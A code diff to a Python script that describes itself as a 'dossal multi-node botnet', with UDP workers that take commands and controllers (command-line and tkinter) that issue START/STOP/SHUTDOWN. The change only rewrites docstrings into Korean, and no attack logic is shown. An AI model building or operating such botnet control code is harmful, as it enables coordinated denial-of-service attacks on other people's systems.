@@ -19,7 +19,7 @@ Workers respond:
 import socket, json, threading, subprocess, sys, os, time, argparse
 
 def run_worker(controller_addr, node_id, listen_port=9998):
-    """Worker: listens for commands, runs dossal."""
+    """워커: 명령 수신 + dossal 실행 (UDP)."""
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.bind(('0.0.0.0', listen_port))
     print(f"[{node_id}] Worker listening on :{listen_port}")
@@ -120,7 +120,7 @@ def run_worker(controller_addr, node_id, listen_port=9998):
             time.sleep(1)
 
 def run_controller_gui(port=9999):
-    """GUI Controller: tkinter-based controller."""
+    """GUI 컨트롤러: tkinter 기반 봇넷 컨트롤 (START/STOP/SHUTDOWN)."""
     import tkinter as tk
     from tkinter import ttk, scrolledtext
     
@@ -220,7 +220,7 @@ def run_controller_gui(port=9999):
     root.mainloop()
 
 def run_controller(port=9999):
-    """Controller: send commands to workers, receive status."""
+    """CLI 컨트롤러: 워커에 명령 전송 + 상태 수신 (stdin 기반)."""
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.bind(('0.0.0.0', port))
     sock.settimeout(1.0)
@@ -279,6 +279,7 @@ def run_controller(port=9999):
                 break
 
 def main():
+    """dossal_net 메인 진입점 (컨트롤러/워커/GUI 선택)."""
     ap = argparse.ArgumentParser(description='dossal multi-node botnet')
     ap.add_argument('--controller', action='store_true', help='Run as controller')
     ap.add_argument('--worker', action='store_true', help='Run as worker')
